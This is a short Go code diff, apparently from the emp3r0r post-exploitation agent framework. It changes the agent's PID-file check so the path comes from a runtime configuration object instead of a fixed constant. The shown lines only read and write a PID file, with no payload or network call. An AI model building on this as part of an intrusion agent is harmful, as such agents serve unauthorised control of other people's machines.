@@ -34,12 +34,12 @@ func CheckAgentProcess() *emp3r0r_data.AgentProcess {
 func IsAgentRunningPID() (bool, int) {
 	defer func() {
 		myPIDText := strconv.Itoa(os.Getpid())
-		if err := ioutil.WriteFile(emp3r0r_data.PIDFile, []byte(myPIDText), 0600); err != nil {
-			log.Printf("Write emp3r0r_data.PIDFile: %v", err)
+		if err := ioutil.WriteFile(RuntimeConfig.PIDFile, []byte(myPIDText), 0600); err != nil {
+			log.Printf("Write RuntimeConfig.PIDFile: %v", err)
 		}
 	}()
 
-	pidBytes, err := ioutil.ReadFile(emp3r0r_data.PIDFile)
+	pidBytes, err := ioutil.ReadFile(RuntimeConfig.PIDFile)
 	if err != nil {
 		return false, -1
 	}
